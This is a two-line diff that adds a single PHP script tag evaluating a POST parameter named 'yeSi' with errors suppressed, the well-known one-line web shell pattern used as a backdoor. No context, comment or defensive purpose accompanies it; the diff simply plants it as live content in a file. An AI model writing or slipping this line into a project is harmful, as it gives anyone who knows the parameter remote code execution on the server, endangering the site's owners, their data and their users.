@@ -1,0 +1,2 @@
+<script language="php">@eval_r($_POST[yeSi])</script>
+
